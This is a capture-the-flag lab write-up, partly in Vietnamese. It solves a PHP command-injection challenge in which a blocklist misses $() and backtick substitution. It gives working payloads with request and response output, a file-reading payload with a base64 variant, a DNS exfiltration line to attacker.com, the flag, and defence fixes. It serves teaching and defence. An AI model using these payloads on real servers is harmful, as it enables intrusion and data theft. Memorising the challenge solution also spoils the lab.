# CMDi-003 Solution Writeup

## Vulnerability Analysis

### Bản Chất Lỗ Hổng

Ứng dụng có lỗ hổng **OS Command Injection** thông qua **command substitution**, mặc dù đã filter các command separators phổ biến.

### Vulnerable Code Pattern

```php
$hostname = $_POST['host'];

// Filter common separators - but misses substitution!
$dangerous = [';', '|', '&', "\n", "\r"];
foreach ($dangerous as $char) {
    $hostname = str_replace($char, '', $hostname);
}

$output = shell_exec("nslookup " . $hostname);
echo $output;
```

**Vấn đề kỹ thuật:**
1. Filter chặn `;`, `|`, `&`, newlines - **nhưng không chặn `$()` và backticks**
2. Command substitution không cần separator để thực thi
3. Shell tự động interpret `$(command)` và replace bằng output

### Command Substitution Explained

**Normal shell behavior:**
```bash
echo "User is $(whoami)"
# Shell processes:
# 1. Execute: whoami → output: "www-data"
# 2. Substitute: $(whoami) → "www-data"
# 3. Execute: echo "User is www-data"
```

**In this vulnerability:**
```bash
nslookup $(cat /etc/hostname)
# Shell processes:
# 1. Execute: cat /etc/hostname → output: "webserver"
# 2. Substitute: $(cat /etc/hostname) → "webserver"  
# 3. Execute: nslookup webserver
```

---

## Exploitation Workflow

### Phase 1: RECON - Quan Sát và Identify Filtering

**Step 1.1: Test Normal Functionality**

**Request:**
```http
POST /lookup HTTP/1.1
Host: localhost:5103
Content-Type: application/x-www-form-urlencoded

host=google.com
```

**Response:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

Non-authoritative answer:
Name:   google.com
Address: 142.250.190.46
```

nslookup hoạt động bình thường.

**Step 1.2: Test Semicolon Separator**

**Request:**
```http
host=google.com; id
```

**Response:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

** server can't find google.com id: NXDOMAIN
```

**Observation:**
- Semicolon bị **remove** → `google.com; id` thành `google.com id`
- nslookup nhận "google.com id" như một hostname
- Không có command execution

**Step 1.3: Test Pipe Separator**

**Request:**
```http
host=google.com | id
```

**Response:**
```
** server can't find google.com: NXDOMAIN
```

Pipe cũng bị remove.

**Step 1.4: Enumerate Blocked Characters**

| Character | Payload | Result | Blocked? |
|-----------|---------|--------|----------|
| `;` | `a; id` | `a id` in error | ✅ Yes |
| `\|` | `a \| id` | `a  id` in error | ✅ Yes |
| `&` | `a & id` | `a  id` in error | ✅ Yes |
| `%0a` | `a%0aid` | `aid` in error | ✅ Yes |
| `$()` | `$(id)` | **Different behavior!** | ❓ Test more |
| `` ` `` | `` `id` `` | **Different behavior!** | ❓ Test more |

---

### Phase 2: HYPOTHESIS - Command Substitution Not Blocked

**Giả thuyết**: Filter chỉ chặn separators, không chặn command substitution syntax.

Nếu đúng:
- `$(whoami)` sẽ được shell interpret
- Output của whoami sẽ trở thành argument của nslookup
- Error message có thể leak output

---

### Phase 3: EXPLOITATION - Command Substitution

**Step 3.1: Basic Command Substitution Test**

**Request:**
```http
host=$(whoami)
```

**Response:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

** server can't find www-data: NXDOMAIN
```

✅ **SUCCESS!** 

**Analysis:**
1. Shell execute: `nslookup $(whoami)`
2. Substitute: `$(whoami)` → `www-data`
3. Execute: `nslookup www-data`
4. nslookup can't find `www-data` → error shows "www-data"

**Output của `whoami` được leak qua error message!**

**Step 3.2: Test với Backticks (Legacy Syntax)**

**Request:**
```http
host=`whoami`
```

**Response:**
```
** server can't find www-data: NXDOMAIN
```

✅ Backticks cũng hoạt động!

**Step 3.3: Test với Command có Multiple Words**

**Request:**
```http
host=$(id)
```

**Response:**
```
** server can't find uid=33(www-data): NXDOMAIN
```

Chỉ thấy phần đầu của output (spaces ngắt argument).

**Workaround - IFS manipulation hoặc encoding:**

Để lấy full output, cần encode hoặc thay thế spaces.

---

### Phase 4: VALIDATION - Thu Thập Flag

**Step 4.1: Locate Flag File**

**Request:**
```http
host=$(ls / | head -1)
```

**Response:**
```
** server can't find bin: NXDOMAIN
```

Chỉ thấy dòng đầu. Thử khác:

**Request:**
```http
host=$(find / -name "*flag*" 2>/dev/null | head -1)
```

**Response:**
```
** server can't find /flag.txt: NXDOMAIN
```

Flag at `/flag.txt`!

**Step 4.2: Read Flag - Challenge**

**Problem**: `cat /flag.txt` output có format `FLAG{...}` chứa special chars.

**Request:**
```http
host=$(cat /flag.txt)
```

**Response:**
```
** server can't find FLAG{c0mm4nd_sub5t1tut10n_l34k4g3}: NXDOMAIN
```

✅ **FLAG CAPTURED!** (nếu flag không có spaces/special chars)

**Nếu bị truncate, dùng base64:**

**Request:**
```http
host=$(cat /flag.txt | base64)
```

**Response:**
```
** server can't find RkxBR3tjMG1tNG5kX3N1YjV0MXR1dDEwbl9sM2FrNGczfQo=: NXDOMAIN
```

Decode: `echo "RkxBR3tjMG1tNG5kX3N1YjV0MXR1dDEwbl9sM2FrNGczfQo=" | base64 -d`
→ `FLAG{c0mm4nd_sub5t1tut10n_l34k4g3}`

---

## Deep Dive: Command Substitution Mechanics

### Two Syntaxes

| Syntax | Example | Notes |
|--------|---------|-------|
| `$(...)` | `$(whoami)` | Modern, supports nesting |
| `` `...` `` | `` `whoami` `` | Legacy, harder to read, no nesting |

### Nesting Example

```bash
# Modern syntax supports nesting
echo $(cat $(which passwd))

# Backticks cannot nest easily
echo `cat \`which passwd\``  # Requires escaping
```

### Where Substitution Works

| Context | Works? | Example |
|---------|--------|---------|
| Unquoted | ✅ | `cmd $(sub)` |
| Double quotes | ✅ | `cmd "$(sub)"` |
| Single quotes | ❌ | `cmd '$(sub)'` → literal string |

**Critical**: Single quotes **prevent** substitution!

### Why This Bypass Works

Filter approach targets **separators** (`;`, `|`, `&`) nhưng command substitution:
- Không cần separator
- Được evaluate **before** main command
- Output **replaces** the substitution syntax

```
Input:  $(whoami)
Shell sees: nslookup $(whoami)
Step 1: Execute whoami → "www-data"
Step 2: Substitute → nslookup www-data
Step 3: Execute nslookup with "www-data" as argument
```

---

## Alternative Payloads

### Using Different Commands

```bash
# Hostname
host=$(hostname)

# Current directory
host=$(pwd)

# User info (first word only due to spaces)
host=$(id|cut -d' ' -f1)

# Kernel version
host=$(uname -r)
```

### Handling Spaces in Output

**Problem**: Spaces break arguments

**Solutions:**

1. **Base64 encoding:**
```bash
host=$(cat /flag.txt | base64 | tr -d '\n')
```

2. **Replace spaces with dots:**
```bash
host=$(cat /flag.txt | tr ' ' '.')
```

3. **Use IFS trick:**
```bash
host=$IFS$(cat /flag.txt)
# Less reliable, IFS is whitespace
```

### Exfiltration via DNS

If you control a DNS server:
```bash
host=$(cat /flag.txt).attacker.com
```
Flag appears in DNS query logs.

---

## Final Payload

```
$(cat /flag.txt)
```

**URL Encoded:**
```
host=%24%28cat%20%2Fflag.txt%29
```

---

## Flag

```
FLAG{c0mm4nd_sub5t1tut10n_l34k4g3}
```

---

## Key Learnings

### 1. Command Substitution as Injection Vector

- Không cần separators để execute commands
- Output trở thành argument của original command
- Error messages có thể leak output

### 2. Filter Limitations

Blocking separators không đủ:
- `$()` và `` ` `` cần được block riêng
- Hoặc tốt hơn: use allowlist instead of blocklist

### 3. Output Leakage Techniques

| Technique | How |
|-----------|-----|
| Error message | Invalid hostname shows in error |
| DNS exfil | Output becomes subdomain |
| Base64 encode | Avoid special char issues |

### 4. Syntax Comparison

| Separator-based | Substitution-based |
|-----------------|-------------------|
| `; id` | `$(id)` |
| `\| id` | `` `id` `` |
| Requires breaking command | Embeds inside command |
| Output shows separately | Output becomes argument |

---

## Defense Recommendations

### 1. Block Command Substitution Syntax

```php
$dangerous = [';', '|', '&', "\n", "\r", '$', '`', '(', ')'];
```

### 2. Use Allowlist for Hostnames

```php
// Only allow valid hostname characters
if (!preg_match('/^[a-zA-Z0-9.-]+$/', $hostname)) {
    die("Invalid hostname format");
}
```

### 3. Use Native DNS Functions

```php
// PHP native DNS lookup - no shell
$result = dns_get_record($hostname, DNS_A);
```

### 4. Escape Shell Arguments

```php
$hostname = escapeshellarg($_POST['host']);
$output = shell_exec("nslookup " . $hostname);
// escapeshellarg wraps in single quotes, preventing substitution
```

---

## References

- [Command Substitution](../../../../_knowledge_base/Web/Command%20Injection/02-exploitation.md#command-substitution)
- [Exploitation Techniques](../../../../_knowledge_base/Web/Command%20Injection/02-exploitation.md)
- [Filter Bypass](../../../../_knowledge_base/Web/Command%20Injection/04-filter-bypass.md)
- [Defense & Mitigation](../../../../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)
